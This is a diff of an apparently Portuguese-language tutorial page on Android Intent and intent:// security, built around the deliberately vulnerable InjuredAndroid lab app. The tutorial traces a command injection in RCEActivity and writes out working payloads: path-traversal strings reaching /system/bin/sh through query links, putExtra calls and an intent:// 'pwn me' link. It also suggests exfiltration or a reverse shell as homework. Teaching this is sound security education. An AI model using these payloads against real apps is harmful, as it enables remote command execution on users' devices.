@@ -3,12 +3,14 @@
 <style>
 
 		@font-face { font-family: "gohu"; src: url("/gohu.woff") format('woff'); }
+		html {
+			background: url('/4rt3/g3n3r4t1v3/sketch_220308a/out.gif') no-repeat center/100% fixed;
+		}
 		body {
 			font-family: 'gohu', monospace;
 			max-width: 50em;
 			margin: 0 auto;
 			color: white;
-			background: black;
 			line-height: calc(1ex / 0.32);
 			margin-top: 3em;
 		}
@@ -85,30 +87,30 @@
 <p>Para mais conteúdos em português, recomendo a <a href="https://www.youtube.com/watch?v=4eso_7RyZ58">série de vídeos</a> do Maycon Vitali sobre Android no geral, assim como <a href="https://www.youtube.com/watch?v=WFUEbMFx2EQ">a minha talk</a> na DupCon com vulnerabilidades reais. Existe também o <a href="https://www.instagram.com/thatmobileproject/">@thatmobileproject</a> para posts sobre segurança em mobile.</p>
 <h2>intent://</h2>
 <p>Os <a href="https://developer.android.com/guide/components/intents-filters">Intents</a> funcionam como a principal forma dos aplicativos se comunicarem internamente entre si. Por exemplo, se um aplicativo quer abrir o <a href="https://github.com/B3nac/InjuredAndroid">InjuredAndroid</a> ele pode iniciar-lo por meio de um Intent utilizando a <a href="https://en.wikipedia.org/wiki/Uniform_Resource_Identifier">URI</a> <code>flag13://rce</code>.</p>
-<div class="codehilite"><pre><span></span><code><span class="n">Intent</span><span class="w"> </span><span class="n">intent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">();</span>
-<span class="n">intent</span><span class="p">.</span><span class="na">setData</span><span class="p">(</span><span class="n">Uri</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="s">&quot;flag13://rce&quot;</span><span class="p">));</span>
-<span class="n">startActivity</span><span class="p">(</span><span class="n">intent</span><span class="p">);</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-java">Intent intent = new Intent();
+intent.setData(Uri.parse(&quot;flag13://rce&quot;));
+startActivity(intent);
+</code></pre>
 
 <p>Além de aceitar todos os elementos de uma <a href="https://en.wikipedia.org/wiki/Uniform_Resource_Identifier">URI</a> ( scheme, host, path, query, fragment ), um Intent também pode levar dados <a href="https://pt.wikipedia.org/wiki/Linguagem_tipada">fortemente tipados</a> por meio dos <a href="https://developer.android.com/reference/android/content/Intent#putExtra(java.lang.String,%20android.os.Bundle)">Intent Extras</a>. Na prática, <em>queries</em> e <em>extras</em> são as formas mais comuns de passar dados entre os aplicativos, eles serão discutidos com exemplos mais adiante.</p>
 <h2>&lt; intent-filter &gt;</h2>
 <p>Como o Android sabe a qual aplicativo se refere <code>flag13://rce</code>? O InjuredAndroid define um <a href="https://developer.android.com/guide/components/intents-filters#Resolution">Intent Filter</a> que diz quais tipos de Intent o Sistema Operacional deve enviar para ele. O Intent Filter é definido no <a href="https://developer.android.com/guide/topics/manifest/manifest-intro">AndroidManifest.xml</a>.</p>
 <p>Vamos analizar a definição do Intent Filter relacionado a <code>flag13://rce</code> : https://github.com/B3nac/InjuredAndroid/blob/master/InjuredAndroid/app/src/main/AndroidManifest.xml</p>
-<div class="codehilite"><pre><span></span><code><span class="nt">&lt;activity</span>
-<span class="w">    </span><span class="na">android:name=</span><span class="s">&quot;.RCEActivity&quot;</span>
-<span class="w">    </span><span class="na">android:label=</span><span class="s">&quot;@string/title_activity_rce&quot;</span>
-<span class="w">    </span><span class="na">android:theme=</span><span class="s">&quot;@style/AppTheme.NoActionBar&quot;</span><span class="nt">&gt;</span>
-<span class="w">    </span><span class="nt">&lt;intent-filter</span><span class="w"> </span><span class="na">android:label=</span><span class="s">&quot;filter_view_flag11&quot;</span><span class="nt">&gt;</span>
-<span class="w">        </span><span class="nt">&lt;action</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.action.VIEW&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
-<span class="w">        </span><span class="nt">&lt;category</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.category.DEFAULT&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
-<span class="w">        </span><span class="nt">&lt;category</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.category.BROWSABLE&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
-<span class="w">        </span><span class="cm">&lt;!-- Accepts URIs that begin with &quot;flag13://” --&gt;</span>
-<span class="w">        </span><span class="nt">&lt;data</span>
-<span class="w">            </span><span class="na">android:host=</span><span class="s">&quot;rce&quot;</span>
-<span class="w">            </span><span class="na">android:scheme=</span><span class="s">&quot;flag13&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
-<span class="w">    </span><span class="nt">&lt;/intent-filter&gt;</span>
-<span class="nt">&lt;/activity&gt;</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-xml">&lt;activity
+    android:name=&quot;.RCEActivity&quot;
+    android:label=&quot;@string/title_activity_rce&quot;
+    android:theme=&quot;@style/AppTheme.NoActionBar&quot;&gt;
+    &lt;intent-filter android:label=&quot;filter_view_flag11&quot;&gt;
+        &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;
+        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;
+        &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot; /&gt;
+        &lt;!-- Accepts URIs that begin with &quot;flag13://” --&gt;
+        &lt;data
+            android:host=&quot;rce&quot;
+            android:scheme=&quot;flag13&quot; /&gt;
+    &lt;/intent-filter&gt;
+&lt;/activity&gt;
+</code></pre>
 
 <p>O atributo <code>name</code> define qual <a href="https://developer.android.com/reference/android/app/Activity">Activity</a> será inicializada, como ele começa com ponto, o nome é resolvido para <code>package</code>+<code>.RCEActivity</code> = <code>b3nac.injuredandroid.RCEActivity</code>. Dentro do <code>&lt;intent-filter&gt;</code>, o <code>action</code> se refere ao <a href="https://developer.android.com/reference/android/content/Intent#intent-structure">tipo de ação</a> que será executada, existem uma miríade de tipos de ações que são definidas na classe Intent, porém, na maioria das vezes é utilizado o <code>action</code> padrão <code>android.intent.action.VIEW</code>.</p>
 <p><code>category</code> são propriedades extras que definem como o Intent vai se comportar. <code>android.intent.category.DEFAULT</code> define que essa Activity pode ser inicializada mesmo se o Intent não tiver nenhum <code>category</code>. <code>android.intent.category.BROWSABLE</code> dita que a Activity pode ser inicializada pelo browser, isso é super importante pois transforma qualquer ataque em remoto. Digamos que um usuário entre em um site malicioso, esse site consegue inicializar um Intent que abre o App apenas se o Intent Filter tiver a propriedade <code>BROWSABLE</code>.</p>
@@ -116,50 +118,50 @@
 <h2>flag13://rce</h2>
 <p>Agora que entedemos como Intents e Intents Filters funcionam, vamos procurar alguma vulnerabilidade no <code>flag13://rce</code> (O "rce" ficou meio óbvio né).</p>
 <p>O código-fonte da Activity <code>b3nac.injuredandroid.RCEActivity</code> : https://github.com/B3nac/InjuredAndroid/blob/master/InjuredAndroid/app/src/main/java/b3nac/injuredandroid/RCEActivity.kt</p>
-<div class="codehilite"><pre><span></span><code><span class="m">49</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">intent</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">intent</span><span class="p">.</span><span class="na">data</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="m">50</span><span class="w">     </span><span class="n">copyAssets</span><span class="p">()</span>
-<span class="m">51</span><span class="w">     </span><span class="kd">val</span><span class="w"> </span><span class="nv">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intent</span><span class="p">.</span><span class="na">data</span>
-<span class="m">52</span><span class="w">     </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
-<span class="m">53</span><span class="w">         </span><span class="kd">val</span><span class="w"> </span><span class="nv">intentParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="o">!!</span><span class="p">.</span><span class="na">getQueryParameter</span><span class="p">(</span><span class="s">&quot;binary&quot;</span><span class="p">)</span>
-<span class="m">54</span><span class="w">         </span><span class="kd">val</span><span class="w"> </span><span class="nv">binaryParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="na">getQueryParameter</span><span class="p">(</span><span class="s">&quot;param&quot;</span><span class="p">)</span>
-<span class="m">55</span><span class="w">         </span><span class="kd">val</span><span class="w"> </span><span class="nv">combinedParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="na">getQueryParameter</span><span class="p">(</span><span class="s">&quot;combined&quot;</span><span class="p">)</span>
-<span class="m">56</span><span class="w">         </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">combinedParam</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="m">57</span><span class="w">             </span><span class="n">childRef</span><span class="p">.</span><span class="na">addListenerForSingleValueEvent</span><span class="p">(</span><span class="k">object</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nc">ValueEventListener</span><span class="w"> </span><span class="p">{</span>
-<span class="m">58</span><span class="w">                 </span><span class="kd">override</span><span class="w"> </span><span class="kd">fun</span><span class="w"> </span><span class="nf">onDataChange</span><span class="p">(</span><span class="n">dataSnapshot</span><span class="p">:</span><span class="w"> </span><span class="n">DataSnapshot</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="m">59</span><span class="w">                     </span><span class="kd">val</span><span class="w"> </span><span class="nv">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dataSnapshot</span><span class="p">.</span><span class="na">value</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">String?</span>
-<span class="m">60</span><span class="w">                     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">combinedParam</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="m">61</span><span class="w">                         </span><span class="n">FlagsOverview</span><span class="p">.</span><span class="na">flagThirteenButtonColor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span>
-<span class="m">62</span><span class="w">                         </span><span class="kd">val</span><span class="w"> </span><span class="nv">secure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SecureSharedPrefs</span><span class="p">()</span>
-<span class="m">63</span><span class="w">                         </span><span class="n">secure</span><span class="p">.</span><span class="na">editBoolean</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;flagThirteenButtonColor&quot;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">)</span>
-<span class="m">64</span><span class="w">                         </span><span class="n">correctFlag</span><span class="p">()</span>
-<span class="m">65</span><span class="w">                     </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
-<span class="m">66</span><span class="w">                         </span><span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">(</span><span class="k">this</span><span class="nd">@RCEActivity</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Try again! :D&quot;</span><span class="p">,</span>
-<span class="m">67</span><span class="w">                                 </span><span class="n">Toast</span><span class="p">.</span><span class="na">LENGTH_SHORT</span><span class="p">).</span><span class="na">show</span><span class="p">()</span>
-<span class="m">68</span><span class="w">                     </span><span class="p">}</span>
-<span class="m">69</span><span class="w">                 </span><span class="p">}</span>
-<span class="m">70</span>
-<span class="m">71</span><span class="w">                 </span><span class="kd">override</span><span class="w"> </span><span class="kd">fun</span><span class="w"> </span><span class="nf">onCancelled</span><span class="p">(</span><span class="n">databaseError</span><span class="p">:</span><span class="w"> </span><span class="n">DatabaseError</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="m">72</span><span class="w">                     </span><span class="n">Log</span><span class="p">.</span><span class="na">e</span><span class="p">(</span><span class="n">TAG</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;onCancelled&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">databaseError</span><span class="p">.</span><span class="na">toException</span><span class="p">())</span>
-<span class="m">73</span><span class="w">                 </span><span class="p">}</span>
-<span class="m">74</span><span class="w">             </span><span class="p">})</span>
-<span class="m">75</span><span class="w">         </span><span class="p">}</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-kotlin">49 if (intent != null &amp;&amp; intent.data != null) {
+50     copyAssets()
+51     val data = intent.data
+52     try {
+53         val intentParam = data!!.getQueryParameter(&quot;binary&quot;)
+54         val binaryParam = data.getQueryParameter(&quot;param&quot;)
+55         val combinedParam = data.getQueryParameter(&quot;combined&quot;)
+56         if (combinedParam != null) {
+57             childRef.addListenerForSingleValueEvent(object : ValueEventListener {
+58                 override fun onDataChange(dataSnapshot: DataSnapshot) {
+59                     val value = dataSnapshot.value as String?
+60                     if (combinedParam == value) {
+61                         FlagsOverview.flagThirteenButtonColor = true
+62                         val secure = SecureSharedPrefs()
+63                         secure.editBoolean(applicationContext, &quot;flagThirteenButtonColor&quot;, true)
+64                         correctFlag()
+65                     } else {
+66                         Toast.makeText(this@RCEActivity, &quot;Try again! :D&quot;,
+67                                 Toast.LENGTH_SHORT).show()
+68                     }
+69                 }
+70
+71                 override fun onCancelled(databaseError: DatabaseError) {
+72                     Log.e(TAG, &quot;onCancelled&quot;, databaseError.toException())
+73                 }
+74             })
+75         }
+</code></pre>
 
 <p>A Activity é inicializada na função <code>onCreate</code> e é lá que o Intent será devidamente tratado. Na linha <a href="https://github.com/B3nac/InjuredAndroid/blob/master/InjuredAndroid/app/src/main/java/b3nac/injuredandroid/RCEActivity.kt#L49">49</a> o aplicativo checa se <code>intent</code> é nulo, se não for ele irá pegar algumas <em>queries</em> <code>binary</code>, <code>param</code> e <code>combined</code>. Se <code>combined</code> for nulo ele não entrará no <code>if</code> da linha 56 e irá para o seguinte <code>else</code>:</p>
-<div class="codehilite"><pre><span></span><code><span class="m">76</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
-<span class="m">77</span>
-<span class="m">78</span><span class="w">     </span><span class="kd">val</span><span class="w"> </span><span class="nv">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">filesDir</span><span class="p">.</span><span class="na">parent</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;/files/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">intentParam</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">binaryParam</span><span class="p">)</span>
-<span class="m">79</span><span class="w">     </span><span class="kd">val</span><span class="w"> </span><span class="nv">bufferedReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span>
-<span class="m">80</span><span class="w">             </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">process</span><span class="p">.</span><span class="na">inputStream</span><span class="p">))</span>
-<span class="m">81</span><span class="w">     </span><span class="kd">val</span><span class="w"> </span><span class="nv">log</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">StringBuilder</span><span class="p">()</span>
-<span class="m">82</span><span class="w">     </span><span class="n">bufferedReader</span><span class="p">.</span><span class="na">forEachLine</span><span class="w"> </span><span class="p">{</span>
-<span class="m">83</span><span class="w">         </span><span class="n">log</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="nb">it</span><span class="p">)</span>
-<span class="m">84</span><span class="w">     </span><span class="p">}</span>
-<span class="m">85</span><span class="w">     </span><span class="n">process</span><span class="p">.</span><span class="na">waitFor</span><span class="p">()</span>
-<span class="m">86</span><span class="w">     </span><span class="kd">val</span><span class="w"> </span><span class="nv">tv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">findViewById</span><span class="o">&lt;</span><span class="n">TextView</span><span class="o">&gt;</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="na">id</span><span class="p">.</span><span class="na">RCEView</span><span class="p">)</span>
-<span class="m">87</span><span class="w">     </span><span class="n">tv</span><span class="p">.</span><span class="na">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">log</span><span class="p">.</span><span class="na">toString</span><span class="p">()</span>
-<span class="m">88</span><span class="w"> </span><span class="p">}</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-kotlin">76 else {
+77
+78     val process = Runtime.getRuntime().exec(filesDir.parent + &quot;/files/&quot; + intentParam + &quot; &quot; + binaryParam)
+79     val bufferedReader = BufferedReader(
+80             InputStreamReader(process.inputStream))
+81     val log = StringBuilder()
+82     bufferedReader.forEachLine {
+83         log.append(it)
+84     }
+85     process.waitFor()
+86     val tv = findViewById&lt;TextView&gt;(R.id.RCEView)
+87     tv.text = log.toString()
+88 }
+</code></pre>
 
 <p>Na linha 78 é passado para a função <a href="https://developer.android.com/reference/java/lang/Runtime#exec(java.lang.String[])"><code>Runtime.getRuntime().exec()</code></a> as variáveis <code>intentParam</code> e <code>binaryParam</code>, essa função executa comandos no sistema, logo temos um <a href="https://owasp.org/www-community/attacks/Command_Injection">Command Injection</a> através do Intent. Vamos tentar explora-lo!</p>
 <p>Normalmente, num Command Injection tentaríamos passar algum carácter para executar outro commando, como <code>&amp;</code>/<code>|</code>/<code>;</code>, porém se tentarmos desse jeito o Android irá dar um erro na primeira parte do comando, o <code>filesDir.parent + "/files/"</code>, pois não encontrará o arquivo, ou dará erro de permissão e não executará o resto do nosso <em>payload</em>. Para resolvermos esse problema podemos voltar os diretórios com <code>../</code> até chegarmos no diretório <em>root</em>, a partir dai podemos executar o <code>/system/bin/sh</code> e executar qualquer comando que quisermos.</p>
@@ -170,35 +172,35 @@
 <li>A Activity <code>RCEActivity</code> executa o comando do atacante</li>
 </ol>
 <p><code>index.html</code></p>
-<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;flag13://rce?binary=..%2F..%2F..%2F..%2F..%2Fsystem%2Fbin%2Fsh%20-c%20%27id%27&amp;param=1&quot;</span><span class="p">&gt;</span>pwn me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-html">&lt;a href=&quot;flag13://rce?binary=..%2F..%2F..%2F..%2F..%2Fsystem%2Fbin%2Fsh%20-c%20%27id%27&amp;param=1&quot;&gt;pwn me&lt;/a&gt;
+</code></pre>
 
 <p><em>Deixo de tarefa de casa exfiltrar o resultado do comando, ou abrir uma reverse shell no Android</em></p>
 <h2>S.Intent_Extras</h2>
 <p>Agora digamos que ao invés de receber as variáveis via <em>query</em>, o App as recebesse via Intent Extras, como fazer? Para criar um Intent com Extras apenas usamos a função <a href="https://developer.android.com/reference/android/content/Intent#putExtra(java.lang.String,%20android.os.Parcelable)">putExtra</a>.</p>
-<div class="codehilite"><pre><span></span><code><span class="n">Intent</span><span class="w"> </span><span class="n">intent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">();</span>
-<span class="n">intent</span><span class="p">.</span><span class="na">setData</span><span class="p">(</span><span class="n">Uri</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="s">&quot;flag13://rce&quot;</span><span class="p">));</span>
-<span class="n">intent</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&quot;binary&quot;</span><span class="p">,</span><span class="s">&quot;../../../../../system/bin/sh -c &#39;id&#39;&quot;</span><span class="p">);</span>
-<span class="n">intent</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&quot;param&quot;</span><span class="p">,</span><span class="s">&quot;1&quot;</span><span class="p">);</span>
-<span class="n">startActivity</span><span class="p">(</span><span class="n">intent</span><span class="p">);</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-java">Intent intent = new Intent();
+intent.setData(Uri.parse(&quot;flag13://rce&quot;));
+intent.putExtra(&quot;binary&quot;,&quot;../../../../../system/bin/sh -c 'id'&quot;);
+intent.putExtra(&quot;param&quot;,&quot;1&quot;);
+startActivity(intent);
+</code></pre>
 
 <p>Ok, com isso conseguimos passar Intents Extras por meio de outro App, mas e pelo Browser? Nós podemos utilizar o scheme <a href="https://developer.chrome.com/docs/multidevice/android/intents/"><code>intent://</code></a> para isso! O Intent de cima fica assim :</p>
-<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;intent://rce/#Intent;scheme=flag13;S.binary=..%2F..%2F..%2F..%2F..%2Fsystem%2Fbin%2Fsh%20-c%20%27id%27;S.param=1;end&quot;</span><span class="p">&gt;</span>pwn me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-html">&lt;a href=&quot;intent://rce/#Intent;scheme=flag13;S.binary=..%2F..%2F..%2F..%2F..%2Fsystem%2Fbin%2Fsh%20-c%20%27id%27;S.param=1;end&quot;&gt;pwn me&lt;/a&gt;
+</code></pre>
 
 <p>Primeiro vem o scheme <code>intent://</code>, depois o host <code>rce</code> e logo após a string <code>#Intent</code>, que é obrigatória. A partir dai todas as variáveis são delimitadas por <code>;</code>. Passamos o <code>scheme=flag13</code> e definimos os Extras. O nome do Extra é precedido do tipo dele, como o Extra <code>binary</code> é do tipo String ele é definido com <code>S.binary</code>. Os Extras podem ter vários tipos, como a documentação do scheme <code>intent://</code> é escarsa, o melhor jeito é ler o código fonte do Android que faz o <em>parse</em> dele:  https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/android/content/Intent.java;l=7115;drc=master</p>
-<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w">      </span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;S.&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="na">putString</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span>
-<span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;B.&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="na">putBoolean</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">Boolean</span><span class="p">.</span><span class="na">parseBoolean</span><span class="p">(</span><span class="n">value</span><span class="p">));</span>
-<span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;b.&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="na">putByte</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">Byte</span><span class="p">.</span><span class="na">parseByte</span><span class="p">(</span><span class="n">value</span><span class="p">));</span>
-<span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;c.&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="na">putChar</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
-<span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;d.&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="na">putDouble</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">Double</span><span class="p">.</span><span class="na">parseDouble</span><span class="p">(</span><span class="n">value</span><span class="p">));</span>
-<span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;f.&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="na">putFloat</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">Float</span><span class="p">.</span><span class="na">parseFloat</span><span class="p">(</span><span class="n">value</span><span class="p">));</span>
-<span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;i.&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="na">putInt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="n">value</span><span class="p">));</span>
-<span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;l.&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="na">putLong</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">Long</span><span class="p">.</span><span class="na">parseLong</span><span class="p">(</span><span class="n">value</span><span class="p">));</span>
-<span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;s.&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="na">putShort</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">Short</span><span class="p">.</span><span class="na">parseShort</span><span class="p">(</span><span class="n">value</span><span class="p">));</span>
-<span class="k">else</span><span class="w"> </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URISyntaxException</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;unknown EXTRA type&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">);</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-java">if      (uri.startsWith(&quot;S.&quot;, i)) b.putString(key, value);
+else if (uri.startsWith(&quot;B.&quot;, i)) b.putBoolean(key, Boolean.parseBoolean(value));
+else if (uri.startsWith(&quot;b.&quot;, i)) b.putByte(key, Byte.parseByte(value));
+else if (uri.startsWith(&quot;c.&quot;, i)) b.putChar(key, value.charAt(0));
+else if (uri.startsWith(&quot;d.&quot;, i)) b.putDouble(key, Double.parseDouble(value));
+else if (uri.startsWith(&quot;f.&quot;, i)) b.putFloat(key, Float.parseFloat(value));
+else if (uri.startsWith(&quot;i.&quot;, i)) b.putInt(key, Integer.parseInt(value));
+else if (uri.startsWith(&quot;l.&quot;, i)) b.putLong(key, Long.parseLong(value));
+else if (uri.startsWith(&quot;s.&quot;, i)) b.putShort(key, Short.parseShort(value));
+else throw new URISyntaxException(uri, &quot;unknown EXTRA type&quot;, i);
+</code></pre>
 
 <p>Por fim só colocar um <code>end</code> (:</p>
 <h2>;end</h2>
